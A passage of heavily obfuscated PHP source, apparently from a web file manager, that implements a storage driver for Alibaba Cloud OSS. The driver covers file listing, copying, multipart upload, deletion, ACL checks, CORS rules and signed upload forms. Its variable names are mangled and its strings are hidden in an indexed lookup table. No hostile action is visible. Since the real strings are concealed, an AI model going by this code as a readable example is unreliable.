{ parent::__construct($²ı‹¾á); $this->signatureVersion($_SERVER[¯µç›È¢][225]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto aÃ¨ ª®¬; CŠ¼Š½â¹: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($óñôúü) { parent::__construct(); include_once SDK_DIR . $_SERVER[¯µç›È¢][1392]; $this->_init($óñôúü); } public function _init($·Çêş†Ü) { $œ÷ÇİŒó =& $_SERVER[¯µç›È¢]; foreach ($·Çêş†Ü as $±Ú™ÔªÃ => $¤”îú¼†) { if (isset($this->{$±Ú™ÔªÃ})) { $this->{$±Ú™ÔªÃ} = $¤”îú¼†; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($œ÷ÇİŒó[1393] . LNG($œ÷ÇİŒó[1394])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $À¿Ùª— =& $_SERVER[¯µç›È¢]; $ºœ¨üèö = new OSS\Model\CorsConfig(); $ß•â¯Ÿ“ = new OSS\Model\CorsRule(); $ß•â¯Ÿ“->addAllowedOrigin($À¿Ùª—[1395]); $ß•â¯Ÿ“->addAllowedMethod($À¿Ùª—[1396]); $ß•â¯Ÿ“->addAllowedMethod($À¿Ùª—[1397]); $ß•â¯Ÿ“->addAllowedMethod($À¿Ùª—[1398]); $ß•â¯Ÿ“->addAllowedMethod($À¿Ùª—[1399]); $ß•â¯Ÿ“->addAllowedMethod($À¿Ùª—[171]); $ß•â¯Ÿ“->setMaxAgeSeconds(600); $ß•â¯Ÿ“->addExposeHeader($À¿Ùª—[1400]); $ß•â¯Ÿ“->addAllowedHeader($À¿Ùª—[1395]); $ºœ¨üèö->addRule($ß•â¯Ÿ“); try { $this->client->putBucketCors($this->bucket, $ºœ¨üèö); } catch (OSS\Core\OssException $íì’™ää) { return !1; } return !0; } public function getBucketCors() { $­ÆÀò”œ =& $_SERVER[¯µç›È¢]; $äø•— = null; try { $äø•— = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $²é¦ÎºÛ) { return null; } if (!$äø•— || !($şã÷ø“Œ = $äø•—->getRules())) { return null; } $ì©¬ úû = $şã÷ø“Œ[0]->getAllowedOrigins(); $…–ğ™²ô = $şã÷ø“Œ[0]->getAllowedMethods(); $èßÏÀÜ = $şã÷ø“Œ[0]->getMaxAgeSeconds(); $®¢¤Ü¼ß = $şã÷ø“Œ[0]->getExposeHeaders(); $µÕğ¯‡´ = $şã÷ø“Œ[0]->getAllowedHeaders(); return array($­ÆÀò”œ[194] => isset($ì©¬ úû[0]) ? $ì©¬ úû[0] : $­ÆÀò”œ[12], $­ÆÀò”œ[198] => $…–ğ™²ô, $­ÆÀò”œ[1401] => $èßÏÀÜ, $­ÆÀò”œ[1402] => isset($®¢¤Ü¼ß[0]) ? $®¢¤Ü¼ß[0] : $­ÆÀò”œ[12], $­ÆÀò”œ[196] => isset($µÕğ¯‡´[0]) ? $µÕğ¯‡´[0] : $­ÆÀò”œ[12]); } public function isBucketCors() { $ŠÜĞô¥‰ =& $_SERVER[¯µç›È¢]; $™Ñº¸Â = $this->getBucketCors(); if (!$™Ñº¸Â || !is_array($™Ñº¸Â)) { return !1; } if ($™Ñº¸Â[$ŠÜĞô¥‰[194]] != $ŠÜĞô¥‰[195] || $™Ñº¸Â[$ŠÜĞô¥‰[196]] != $ŠÜĞô¥‰[195]) { return !1; } $ğüœ—¾ê = array_map($ŠÜĞô¥‰[197], $™Ñº¸Â[$ŠÜĞô¥‰[198]]); if (!is_array($ğüœ—¾ê)) { $ğüœ—¾ê = array(); } $ô‰ÄËÏé = array($ŠÜĞô¥‰[199], $ŠÜĞô¥‰[200], $ŠÜĞô¥‰[201], $ŠÜĞô¥‰[202], $ŠÜĞô¥‰[203]); $ã÷Ò –ğ = array_diff($ô‰ÄËÏé, $ğüœ—¾ê); return empty($ã÷Ò –ğ); } public function mkfile($–Š©”ñı, $Ìàç—ŸÉ = '', $ş‡‹Ö = REPEAT_RENAME) { $Ø¸¡ÅÒ“ = $this->setContent($–Š©”ñı, $Ìàç—ŸÉ); if ($Ø¸¡ÅÒ“ !== !1) { return $this->getPathOuter($–Š©”ñı); } return !1; } public function mkdir($Œµê¸°Ò, $ìŒ¤É½± = REPEAT_SKIP) { if ($this->_isFolder($Œµê¸°Ò)) { return $this->getPathOuter($Œµê¸°Ò); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Œµê¸°Ò)); } catch (OSS\Core\OssException $È¢ı€˜„) { return !1; } return $this->getPathOuter($Œµê¸°Ò); } private function fileList($Ø¥¢†ûŞ, $çì•İˆ– = '', $­í¹ˆÓ¢ = 0) { $¶œ©Âü =& $_SERVER[¯µç›È¢]; $Ø¥¢†ûŞ = trim($Ø¥¢†ûŞ, $¶œ©Âü[8]); $•ûÀ¸Ë = empty($Ø¥¢†ûŞ) && $Ø¥¢†ûŞ !== $¶œ©Âü[204] ? $¶œ©Âü[12] : $Ø¥¢†ûŞ . $¶œ©Âü[8]; $ËÕûí¨ = $¶œ©Âü[12]; $£ã£ëÏ€ = 1000; $°ŒòäÒ² = $this->listItemCache === !1 ? !1 : !0; $¿Òæş  = $ÂÅÖµ­ = array(); while (!0) { check_abort(); $»Â¡‰²² = array($¶œ©Âü[1403] => $çì•İˆ–, $¶œ©Âü[1404] => $•ûÀ¸Ë, $¶œ©Âü[1405] => $£ã£ëÏ€, $¶œ©Âü[1406] => $ËÕûí¨); try { $Àˆê¯”¬ = $this->client->listObjects($this->bucket, $»Â¡‰²²); } catch (OSS\Core\OssException $çÌ†îŸ¬) { break; } $ËÕûí¨ = $Àˆê¯”¬->getNextMarker(); $Ó˜ê³ê• = $Àˆê¯”¬->getObjectList(); $ª¦š‰ñğ = $Àˆê¯”¬->getPrefixList(); foreach ($Ó˜ê³ê• as $ìÄ²õ¿›) { if ($ìÄ²õ¿›->getKey() == $•ûÀ¸Ë) { continue; } $ÃÙ›™¹÷ = $ìÄ²õ¿›->getKey(); $Áğ³Ó = $ìÄ²õ¿›->getSize(); $á›šõªÈ = $ìÄ²õ¿›->getLastModified(); $Å¸›ûÑ = $­í¹ˆÓ¢ ? array($¶œ©Âü[32] => $ÃÙ›™¹÷, $¶œ©Âü[90] => $Áğ³Ó, $¶œ©Âü[210] => strtotime($á›šõªÈ)) : $ÃÙ›™¹÷; $Áû§ÎÀ÷ = $Áğ³Ó == 0 && substr($ÃÙ›™¹÷, strlen($ÃÙ›™¹÷) - 1, 1) == $¶œ©Âü[8] ? !0 : !1; if ($°ŒòäÒ²) { $this->cacheMethod($¶œ©Âü[212], $ÃÙ›™¹÷, $Áû§ÎÀ÷); $this->cacheMethod($¶œ©Âü[213], $ÃÙ›™¹÷, array($¶œ©Âü[90] => $Áğ³Ó, $¶œ©Âü[1407] => $Áğ³Ó, $¶œ©Âü[96] => strtotime($á›šõªÈ), $¶œ©Âü[1408] => $á›šõªÈ)); } if ($Áû§ÎÀ÷) { $¿Òæş [] = $ÃÙ›™¹÷; continue; } $ÂÅÖµ­[] = $Å¸›ûÑ; } foreach ($ª¦š‰ñğ as $ƒöçì“) { $¿Òæş [] = $ƒöçì“->getPrefix(); if ($°ŒòäÒ²) { $this->cacheMethod($¶œ©Âü[212], $ÃÙ›™¹÷, !0); } } if ($ËÕûí¨ === $¶œ©Âü[12]) { break; } } if ($°ŒòäÒ²) { $this->cacheMethod($¶œ©Âü[212], $Ø¥¢†ûŞ, !0); } return array($¶œ©Âü[87] => $¿Òæş , $¶œ©Âü[86] => $ÂÅÖµ­); } public function copyFile($ÎçŠÉÈ¦, $ìù·ÀŒ) { $ÈÚµôÚ† = $this->size($ÎçŠÉÈ¦); if ($ÈÚµôÚ† < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÎçŠÉÈ¦, $this->bucket, $this->pathEncode($ìù·ÀŒ)); } catch (OSS\Core\OssException $øËİ§·) { return !1; } return $this->getPathOuter($ìù·ÀŒ); } $†ªÎ»Œ = $this->multiCopyObject($ÎçŠÉÈ¦, $ìù·ÀŒ, $ÈÚµôÚ†); return $†ªÎ»Œ ? $this->getPathOuter($ìù·ÀŒ) : !1; } private function multiCopyObject($„©ÔÑóØ, $§š¤Ùñº, $íâùÓİú) { $ÓÓÖ÷éª =& $_SERVER[¯µç›È¢]; try { $®ìê Ïã = array(); if ($ò©òŞÎÔ = $this->hashMd5($„©ÔÑóØ)) { $®ìê Ïã = array(OSS\OssClient::OSS_HEADERS => array($ÓÓÖ÷éª[1409] => $ò©òŞÎÔ)); } $”‘è¾³¦ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($§š¤Ùñº), $®ìê Ïã); $Ö¶ÀğÕ« = 1; $Á¯ß›â³ = 0; $ÕÖö˜äª = array(); $”ª…Ç = 1024 * 1024 * 10; $¦ÓÈªŞ› = $this->client->generateMultiuploadParts($íâùÓİú, $”ª…Ç); foreach ($¦ÓÈªŞ› as $Æıˆ¼  => $óÎÚø­©) { $¹º¬àÇ = $Á¯ß›â³ + (int) $óÎÚø­©[$ÓÓÖ÷éª[1410]]; $¾“ˆ¢ï× = (int) $óÎÚø­©[$ÓÓÖ÷éª[345]] + $¹º¬àÇ - 1; $ÚòÄÇÕª = array($ÓÓÖ÷éª[1411] => $¹º¬àÇ, $ÓÓÖ÷éª[1412] => $¾“ˆ¢ï×); $ÕÖö˜äª[] = $this->client->uploadPartCopy($this->bucket, $„©ÔÑóØ, $this->bucket, $this->pathEncode($§š¤Ùñº), $Ö¶ÀğÕ«, $”‘è¾³¦, $ÚòÄÇÕª); $Ö¶ÀğÕ« = $Ö¶ÀğÕ« + 1; } $ù¦”úıÁ = array(); foreach ($ÕÖö˜äª as $Æıˆ¼  => $ÚÄ·óô) { $ù¦”úıÁ[] = array($ÓÓÖ÷éª[1413] => $Æıˆ¼  + 1, $ÓÓÖ÷éª[1414] => $ÚÄ·óô); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($§š¤Ùñº), $”‘è¾³¦, $ù¦”úıÁ); } catch (OSS\Core\OssException $¾Ğ˜íÌª) { return !1; } return !0; } public function moveFile($”ğ ò”±, $½ÍÙ¤Å„) { if ($this->copyFile($”ğ ò”±, $½ÍÙ¤Å„)) { $this->remove($”ğ ò”±); return $this->getPathOuter($½ÍÙ¤Å„); } return !1; } public function delFile($âĞÂ‡ö²) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($âĞÂ‡ö²)); } catch (OSS\Core\OssException $ªüëôéˆ) { return !1; } return !0; } public function delFolder($ëÊµï¾Ë) { $ƒìô‘Öœ =& $_SERVER[¯µç›È¢]; if (!$this->exist($ëÊµï¾Ë)) { return !0; } $this->listItemCache = !1; $©Í‰Ùæ = $this->fileList($ëÊµï¾Ë); $this->listItemCache = !0; $İÔÊæ¢Ì = trim($ëÊµï¾Ë, $ƒìô‘Öœ[8]) . $ƒìô‘Öœ[8]; if (!empty($ëÊµï¾Ë) && $ëÊµï¾Ë !== $ƒìô‘Öœ[204] && !in_array($İÔÊæ¢Ì, $©Í‰Ùæ[$ƒìô‘Öœ[87]])) { $©Í‰Ùæ[$ƒìô‘Öœ[87]][] = $İÔÊæ¢Ì; } $™Ì€ûçô = $this->delByBatch($©Í‰Ùæ[$ƒìô‘Öœ[86]]); if (!$™Ì€ûçô) { return !1; } $™Ì€ûçô = $this->delByBatch($©Í‰Ùæ[$ƒìô‘Öœ[87]]); if (!$™Ì€ûçô) { return !1; } return $this->delFile($İÔÊæ¢Ì); } private function delByBatch($ÏÕ»ëí—) { foreach (array_chunk($ÏÕ»ëí—, 1000) as $‚·‡ÑÛØ) { try { $this->client->deleteObjects($this->bucket, $‚·‡ÑÛØ); } catch (OSS\Core\OssException $ŒüŸÆĞ§) { return !1; } } return !0; } public function rename($†Œû½˜ø, $©²à‡Öï) { return $this->renameObject($†Œû½˜ø, $©²à‡Öï); } private function fileInfo($®·¤Å¾, $ò…½½Ù = false, $ÀÔß‰¾ù = array()) { $Áë›ŒØ =& $_SERVER[¯µç›È¢]; $Ğ®ªÆÖ£ = array($Áë›ŒØ[32] => $this->pathThis($®·¤Å¾), $Áë›ŒØ[88] => $this->getPathOuter($®·¤Å¾), $Áë›ŒØ[33] => $Áë›ŒØ[206], $Áë›ŒØ[90] => isset($ÀÔß‰¾ù[$Áë›ŒØ[90]]) ? $ÀÔß‰¾ù[$Áë›ŒØ[90]] : 0, $Áë›ŒØ[181] => $this->ext($®·¤Å¾)); if ($ò…½½Ù) { return $Ğ®ªÆÖ£; } $Ğ®ªÆÖ£[$Áë›ŒØ[207]] = $Ğ®ªÆÖ£[$Áë›ŒØ[96]] = 0; $Ğ®ªÆÖ£[$Áë›ŒØ[208]] = $Ğ®ªÆÖ£[$Áë›ŒØ[209]] = !0; if (empty($ÀÔß‰¾ù)) { $ºÜŒš•¹ = $this->objectMeta($®·¤Å¾); if (!$ºÜŒš•¹) { return $Ğ®ªÆÖ£; } $ÀÔß‰¾ù = array($Áë›ŒØ[96] => strtotime($ºÜŒš•¹[$Áë›ŒØ[1408]]), $Áë›ŒØ[90] => $ºÜŒš•¹[$Áë›ŒØ[1407]] + 0); } if (isset($ÀÔß‰¾ù[$Áë›ŒØ[90]])) { $Ğ®ªÆÖ£[$Áë›ŒØ[90]] = $ÀÔß‰¾ù[$Áë›ŒØ[90]]; } if (isset($ÀÔß‰¾ù[$Áë›ŒØ[96]])) { $Ğ®ªÆÖ£[$Áë›ŒØ[96]] = $ÀÔß‰¾ù[$Áë›ŒØ[96]]; } if (isset($ÀÔß‰¾ù[$Áë›ŒØ[210]]) && !trim($Ğ®ªÆÖ£[$Áë›ŒØ[96]])) { $Ğ®ªÆÖ£[$Áë›ŒØ[96]] = $ÀÔß‰¾ù[$Áë›ŒØ[210]]; } return $Ğ®ªÆÖ£; } private function folderInfo($§¹ŸÀ†Ÿ, $Ãğ·ªÙÉ = false, $²¨ã¡• = array()) { $­Î¯İ‚­ =& $_SERVER[¯µç›È¢]; $İôØÑ‡ì = array($­Î¯İ‚­[32] => $this->pathThis($§¹ŸÀ†Ÿ), $­Î¯İ‚­[88] => $this->getPathOuter($­Î¯İ‚­[8] . $§¹ŸÀ†Ÿ), $­Î¯İ‚­[33] => $­Î¯İ‚­[89]); if ($Ãğ·ªÙÉ) { return $İôØÑ‡ì; } $İôØÑ‡ì[$­Î¯İ‚­[207]] = $İôØÑ‡ì[$­Î¯İ‚­[96]] = 0; $İôØÑ‡ì[$­Î¯İ‚­[208]] = $İôØÑ‡ì[$­Î¯İ‚­[209]] = !0; if (empty($²¨ã¡•)) { $§¹ŸÀ†Ÿ = rtrim($§¹ŸÀ†Ÿ, $­Î¯İ‚­[8]) . $­Î¯İ‚­[8]; $¬®™ë·È = $this->objectMeta($§¹ŸÀ†Ÿ); if (!$¬®™ë·È) { return $İôØÑ‡ì; } $²¨ã¡• = array($­Î¯İ‚­[207] => $¬®™ë·È[$­Î¯İ‚­[516]][$­Î¯İ‚­[1415]], $­Î¯İ‚­[96] => strtotime($¬®™ë·È[$­Î¯İ‚­[1408]])); } if (isset($²¨ã¡•[$­Î¯İ‚­[96]])) { $İôØÑ‡ì[$­Î¯İ‚­[96]] = $²¨ã¡•[$­Î¯İ‚­[96]]; } if (isset($²¨ã¡•[$­Î¯İ‚­[207]])) { $İôØÑ‡ì[$­Î¯İ‚­[207]] = $²¨ã¡•[$­Î¯İ‚­[207]]; } return $İôØÑ‡ì; } public function listPath($…Ç§í—ı, $Å¸ÜÓÜä = false) { $›˜ùİ’Ë =& $_SERVER[¯µç›È¢]; $ÒŞ”Œë‹ = $this->fileList($…Ç§í—ı, $›˜ùİ’Ë[8], !0); foreach ($ÒŞ”Œë‹[$›˜ùİ’Ë[87]] as $Š…Ì†«² => $Ë©æùÛ) { $ÒŞ”Œë‹[$›˜ùİ’Ë[87]][$Š…Ì†«²] = $this->folderInfo($Ë©æùÛ, $Å¸ÜÓÜä, $Ë©æùÛ); } foreach ($ÒŞ”Œë‹[$›˜ùİ’Ë[86]] as $Š…Ì†«² => $Ë©æùÛ) { $ÒŞ”Œë‹[$›˜ùİ’Ë[86]][$Š…Ì†«²] = $this->fileInfo($Ë©æùÛ[$›˜ùİ’Ë[32]], $Å¸ÜÓÜä, $Ë©æùÛ); } return $ÒŞ”Œë‹; } public function has($ìÙ»ÆØù, $À¢«îğ = false, $§Ìé‡¹‘ = true) { $«Õ¦Ôâé =& $_SERVER[¯µç›È¢]; $ìÙ»ÆØù = trim($ìÙ»ÆØù, $«Õ¦Ôâé[8]); $ßÊ—âŞ• = empty($ìÙ»ÆØù) && $ìÙ»ÆØù !== $«Õ¦Ôâé[204] ? $«Õ¦Ôâé[12] : $ìÙ»ÆØù . $«Õ¦Ôâé[8]; $œêëÕ«Š = $«Õ¦Ôâé[12]; $×Š¶úÂğ = 500; $Œ¹ÊçÂò = $¶åŒœú“ = 0; while (!0) { check_abort(); $äüàÍ‡Æ = array($«Õ¦Ôâé[1403] => $«Õ¦Ôâé[8], $«Õ¦Ôâé[1404] => $ßÊ—âŞ•, $«Õ¦Ôâé[1405] => $×Š¶úÂğ, $«Õ¦Ôâé[1406] => $œêëÕ«Š); try { $±´Ÿ½…ƒ = $this->client->listObjects($this->bucket, $äüàÍ‡Æ); } catch (OSS\Core\OssException $Ûñ‰ÔØŒ) { break; } $œêëÕ«Š = $±´Ÿ½…ƒ->getNextMarker(); $°¿×Å¢ = $±´Ÿ½…ƒ->getObjectList(); $É¨ø³€ü = $±´Ÿ½…ƒ->getPrefixList(); if ($À¢«îğ) { if (count($°¿×Å¢) > 1 || count($°¿×Å¢) == 1 && $°¿×Å¢[0]->getKey() != $ßÊ—âŞ•) { $Œ¹ÊçÂò += count($°¿×Å¢) - 1; } if (!empty($É¨ø³€ü)) { $¶åŒœú“ += count($É¨ø³€ü); } if ($œêëÕ«Š === $«Õ¦Ôâé[12]) { break; } continue; } if ($§Ìé‡¹‘) { if (!empty($°¿×Å¢)) { if (count($°¿×Å¢) > 1 || $°¿×Å¢[0]->getKey() != $ßÊ—âŞ•) { return !0; } } } else { if (!empty($É¨ø³€ü)) { return !0; } } if ($œêëÕ«Š === $«Õ¦Ôâé[12]) { break; } } if ($À¢«îğ) { return array($«Õ¦Ôâé[216] => $Œ¹ÊçÂò, $«Õ¦Ôâé[217] => $¶åŒœú“); } return !1; } public function listAll($õ°ãÁ±) { $¶‹¤· =& $_SERVER[¯µç›È¢]; $€œ…÷ŠÄ = $this->fileList($õ°ãÁ±, $¶‹¤·[12], !0); $Ïë³™¼ö = array(); foreach ($€œ…÷ŠÄ[$¶‹¤·[86]] as $µôúÜ°º) { $Ïë³™¼ö[$µôúÜ°º[$¶‹¤·[32]]] = $µôúÜ°º[$¶‹¤·[90]]; } foreach ($€œ…÷ŠÄ[$¶‹¤·[87]] as $µôúÜ°º) { if (is_string($µôúÜ°º)) { $Ïë³™¼ö[$µôúÜ°º] = 0; } } return $this->listAllFiles($õ°ãÁ±, array_keys($Ïë³™¼ö), $Ïë³™¼ö); } public function canRead($‘•¤«óĞ) { $¡õàê÷¾ =& $_SERVER[¯µç›È¢]; $üšµÙ‰Ã = $this->pathAcl($‘•¤«óĞ); return $üšµÙ‰Ã == $¡õàê÷¾[1416] || $üšµÙ‰Ã == $¡õàê÷¾[558] ? !0 : !1; } public function canWrite($êÒ¶Á…‡) { $š¾óŒÚö = $this->pathAcl($êÒ¶Á…‡); return $š¾óŒÚö == $_SERVER[¯µç›È¢][558] ? !0 : !1; } public function pathAcl($²ŠşĞª) { $…û£Å­€ =& $_SERVER[¯µç›È¢]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ºÅÀ‹ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($²ŠşĞª)); } catch (OSS\Core\OssException $³€ºêßÒ) { return !1; } $×™ñŒÆš = $ºÅÀ‹ == $…û£Å­€[37] ? $this->bucketAcl : $ºÅÀ‹; if ($×™ñŒÆš == $…û£Å­€[1417]) { return $…û£Å­€[1416]; } if ($×™ñŒÆš == $…û£Å­€[1418]) { return $…û£Å­€[558]; } return $×™ñŒÆš; } private function chmodPath($€üİÌ§ê, $¥¾·ƒ… = '') { $ôÌˆ·¿¼ =& $_SERVER[¯µç›È¢]; $ûœÆÒƒ™ = empty($¥¾·ƒ…) ? $ôÌˆ·¿¼[1418] : $¥¾·ƒ…; $ôêàåıæ = array($ôÌˆ·¿¼[37], $ôÌˆ·¿¼[205], $ôÌˆ·¿¼[1417], $ôÌˆ·¿¼[1418]); if (!in_array($ûœÆÒƒ™, $ôêàåıæ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($€üİÌ§ê), $ûœÆÒƒ™); } catch (OSS\Core\OssException $€œ¿Ù¿Á) { return !1; } return !0; } public function getContent($—ÌËé¼) { return $this->fileSubstr($—ÌËé¼, -1); } public function setContent($¹íã¾æË, $°Ã§ò² = '') { $¢åßÍŠç =& $_SERVER[¯µç›È¢]; try { $ÍêºÒ¨ = $this->trafficLimit($¢åßÍŠç[1419]); $ƒ€Ûìé° = $this->client->putObject($this->bucket, $this->pathEncode($¹íã¾æË), $°Ã§ò², $ÍêºÒ¨); } catch (OSS\Core\OssException $ÓÜ²Ô‹) { return !1; } $õìıĞÎ× = array($¢åßÍŠç[1409] => trim($ƒ€Ûìé°[$¢åßÍŠç[1420]], $¢åßÍŠç[129]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¹íã¾æË))); $this->updateObjMeta($¹íã¾æË, $õìıĞÎ×); return isset($ƒ€Ûìé°[$¢åßÍŠç[1421]][$¢åßÍŠç[1368]]) ? !0 : !1; } private function updateObjMeta($…ÀÛø, $ªßãé¿ˆ) { $…ÀÛø = $this->pathEncode($…ÀÛø); try { $µ¦¶¶Å§ = array(OSS\OssClient::OSS_HEADERS => $ªßãé¿ˆ); $this->client->copyObject($this->bucket, $…ÀÛø, $this->bucket, $…ÀÛø, $µ¦¶¶Å§); } catch (OSS\Core\OssException $äØÀèèœ) { return !1; } return !0; } public function upload($õäº˜š, $ÙŞŠşÔæ, $µÏ½ÏÇ = false, $ëÂ¡òÊ“ = REPEAT_REPLACE) { $¨”Í¡®³ =& $_SERVER[¯µç›È¢]; $‹Ê¶Õ›² = trim($õäº˜š, $¨”Í¡®³[8]); $®øĞÜ™ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¨”Í¡®³[1409] => @md5_file($ÙŞŠşÔæ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($õäº˜š))); $®øĞÜ™ = $this->trafficLimit($¨”Í¡®³[1419], $®øĞÜ™); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($‹Ê¶Õ›²), $ÙŞŠşÔæ, $®øĞÜ™); } catch (OSS\Core\OssException $­¶÷ƒ¿) { return !1; } return $this->getPathOuter($õäº˜š); } public function getHost() { $šöÆ®ºÊ =& $_SERVER[¯µç›È¢]; $ÓãŞ îú = explode($šöÆ®ºÊ[190], parent::getHost()); return $ÓãŞ îú[0] . $šöÆ®ºÊ[190] . $this->bucket . $šöÆ®ºÊ[10] . $ÓãŞ îú[1]; } public function uploadFormData($ˆùÀ­¢, $¤ˆ’ìËÚ = 3600) { $¨ÃØş² =& $_SERVER[¯µç›È¢]; if (!($Âà¸©ºÌ = $this->getHost())) { return !1; } $çÛÙßãá = $¤ˆ’ìËÚ; $Ÿ¸„¬Ï¬ = date($¨ÃØş²[1422], time() + $çÛÙßãá); $ ¸«­ìé = new DateTime($Ÿ¸„¬Ï¬); $Û±³ÇÂå = $ ¸«­ìé->format(DateTime::ISO8601); $¨Ëè°ê– = strpos($Û±³ÇÂå, $¨ÃØş²[304]); $Û±³ÇÂå = substr($Û±³ÇÂå, 0, $¨Ëè°ê–) . $¨ÃØş²[1423]; $¼×ò„İÎ = 1048576000 * 5; $îüàÜĞş = $this->pathFather($ˆùÀ­¢); $°²õ±·Ö = array($¨ÃØş²[1322] => $Û±³ÇÂå, $¨ÃØş²[1323] => array(array($¨ÃØş²[1424], 0, $¼×ò„İÎ), array($¨ÃØş²[1326], $¨ÃØş²[1327], $îüàÜĞş))); $«Ğø½Ñ› = base64_encode(json_encode($°²õ±·Ö)); $ã¨£Äš÷ = base64_encode(hash_hmac($¨ÃØş²[240], $«Ğø½Ñ›, $this->secret, !0)); $¦‚÷õË = array($¨ÃØş²[1332] => $«Ğø½Ñ›, $¨ÃØş²[1425] => $this->accessKey, $¨ÃØş²[1328] => $¨ÃØş²[1320], $¨ÃØş²[1426] => $ã¨£Äš÷, $¨ÃØş²[188] => $Âà¸©ºÌ); $¦‚÷õË = $this->trafficLimit($¨ÃØş²[1419], $¦‚÷õË); return $¦‚÷õË; } public function multiUploadFormData($Ñ£’êñ, $²Ë†€Ú• = 3600) { $éá“Ôíº =& $_SERVER[¯µç›È¢]; if (!($öˆ¯ö˜ø = $this->getHost())) { return !1; } $ëÓşà¢ = $this->trafficLimit($éá“Ôíº[1419]); $¶ê×èŞÓ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ñ£’êñ), $ëÓşà¢); return array($éá“Ôíº[232] => $¶ê×èŞÓ, $éá“Ôíº[188] => $öˆ¯ö˜ø . $éá“Ôíº[8] . $this->pathEncode($Ñ£’êñ), $éá“Ôíº[233] => gmdate($éá“Ôíº[1427]), $éá“Ôíº[105] => $Ñ£’êñ); } public function multiUploadAuthData($Ş¥‡Â‰æ, $€Ş®ßÑŒ = array()) { $ş¿Î°èñ =& $_SERVER[¯µç›È¢]; $®ìœä¤ = isset($€Ş®ßÑŒ[$ş¿Î°èñ[233]]) ? $€Ş®ßÑŒ[$ş¿Î°èñ[233]] : gmdate($ş¿Î°èñ[1427]); $â”ù°ƒ™ = isset($€Ş®ßÑŒ[$ş¿Î°èñ[181]]) ? $€Ş®ßÑŒ[$ş¿Î°èñ[181]] : $ş¿Î°èñ[12]; $‡òâØôó = $Ş¥‡Â‰æ; if (isset($€Ş®ßÑŒ[$ş¿Î°èñ[105]])) { $‡òâØôó = $€Ş®ßÑŒ[$ş¿Î°èñ[105]]; unset($€Ş®ßÑŒ[$ş¿Î°èñ[105]]); } if (isset($€Ş®ßÑŒ[$ş¿Î°èñ[234]])) { $€Ş®ßÑŒ[$ş¿Î°èñ[233]] = $®ìœä¤; return $this->listUploadParts($‡òâØôó, $€Ş®ßÑŒ); } $‡şèÚñ = array($ş¿Î°èñ[235], $ş¿Î°èñ[12], $ş¿Î°èñ[131], $®ìœä¤, "\x78\x2d\157\x73\163\x2d\x64\x61\164\145\72{$®ìœä¤}", $ş¿Î°èñ[8] . $this->bucket . $ş¿Î°èñ[8] . $‡òâØôó . $â”ù°ƒ™); if (strpos($â”ù°ƒ™, $ş¿Î°èñ[236]) === 0) { $‡şèÚñ[0] = $ş¿Î°èñ[237]; if ($¬Æ¥åà = $this->trafficLimit($ş¿Î°èñ[1419])) { $‡òâØôó = $ş¿Î°èñ[1428]; array_splice($‡şèÚñ, 5, 0, $‡òâØôó . $ş¿Î°èñ[4] . $¬Æ¥åà[$‡òâØôó]); } } if (isset($€Ş®ßÑŒ[$ş¿Î°èñ[238]]) && $€Ş®ßÑŒ[$ş¿Î°èñ[238]] == $ş¿Î°èñ[239]) { $‡şèÚñ[0] = $ş¿Î°èñ[239]; } if (!empty($€Ş®ßÑŒ[$ş¿Î°èñ[1429]])) { $‘Ğ·ìíó = array_merge(array($‡şèÚñ[4]), $€Ş®ßÑŒ[$ş¿Î°èñ[1429]]); sort($‘Ğ·ìíó); $‡şèÚñ[4] = implode($ş¿Î°èñ[66], $‘Ğ·ìíó); } $ÁÃªìœÓ = implode($ş¿Î°èñ[66], $‡şèÚñ); $İ§Ó¹ˆ = base64_encode(hash_hmac($ş¿Î°èñ[240], $ÁÃªìœÓ, $this->secret, !0)); $•ã˜³¦€ = $ş¿Î°èñ[1393] . $this->accessKey . $ş¿Î°èñ[4] . $İ§Ó¹ˆ; if (strpos($â”ù°ƒ™, $ş¿Î°èñ[236]) === 0) { $•ã˜³¦€ = array($ş¿Î°èñ[242] => $•ã˜³¦€, $ş¿Î°èñ[233] => $®ìœä¤); if ($¬Æ¥åà) { $•ã˜³¦€ = array_merge($•ã˜³¦€, $¬Æ¥åà); } } return $•ã˜³¦€; } public function listUploadParts($™ç¼œĞå, $¯úÏİ¶“) { $’…ü±Ÿ§ =& $_SERVER[¯µç›È¢]; $ŞĞì¨ş¡ = parse_url_query($¯úÏİ¶“[$’…ü±Ÿ§[181]]); $œ¿’Ù‚ü = $this->client->listParts($this->bucket, $this->pathEncode($™ç¼œĞå), $ŞĞì¨ş¡[$’…ü±Ÿ§[232]]); $Õø¢ş…í = $œ¿’Ù‚ü->getListPart(); $äúÉËËä = array(); foreach ($Õø¢ş…í as $¸ï€Á½ë) { $äúÉËËä[] = array($’…ü±Ÿ§[1413] => $¸ï€Á½ë->getPartNumber(), $’…ü±Ÿ§[1414] => trim($¸ï€Á½ë->getETag(), $’…ü±Ÿ§[129])); } unset($¯úÏİ¶“[$’…ü±Ÿ§[234]], $¯úÏİ¶“[$’…ü±Ÿ§[238]]); $°‹®Á¦» = $this->multiUploadAuthData($™ç¼œĞå, $¯úÏİ¶“); if (empty($°‹®Á¦»)) { return !1; } return 